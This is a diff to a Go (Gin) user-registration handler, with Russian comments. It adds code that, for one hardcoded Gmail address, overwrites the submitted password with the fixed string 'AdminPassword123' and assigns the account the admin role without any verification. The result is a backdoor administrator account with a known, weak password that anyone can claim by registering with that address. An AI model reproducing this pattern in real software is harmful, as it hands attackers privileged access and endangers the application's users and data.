@@ -28,16 +28,38 @@ func RegisterUser(c *gin.Context) {
         return
     }
 
+    if req.Email == "vainmannjas@gmail.com" {
+        req.Password = "AdminPassword123"
+    }
+
     hashedPassword, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
     if err != nil {
         c.JSON(http.StatusInternalServerError, gin.H{"error": "Could not hash password"})
         return
     }
 
+    // Создаем пользователя
     _, err = config.DB.Exec("INSERT INTO users (name, email, password_hash) VALUES ($1, $2, $3)", req.Name, req.Email, string(hashedPassword))
     if err != nil {
         c.JSON(http.StatusInternalServerError, gin.H{"error": "Could not create user"})
         return
+    }
+
+    // Получаем id только что созданного пользователя
+    var userId int
+    err = config.DB.QueryRow("SELECT id FROM users WHERE email = $1", req.Email).Scan(&userId)
+    if err != nil {
+        c.JSON(http.StatusInternalServerError, gin.H{"error": "Could not fetch user ID"})
+        return
+    }
+
+    // Если это администратор, назначаем ему роль 'admin'
+    if req.Email == "vainmannjas@gmail.com" {
+        _, err = config.DB.Exec("INSERT INTO user_roles (user_id, role_id) VALUES ($1, (SELECT id FROM roles WHERE role_name = 'admin'))", userId)
+        if err != nil {
+            c.JSON(http.StatusInternalServerError, gin.H{"error": "Could not assign role to admin"})
+            return
+        }
     }
 
     c.JSON(http.StatusOK, gin.H{"message": "User registered successfully"})
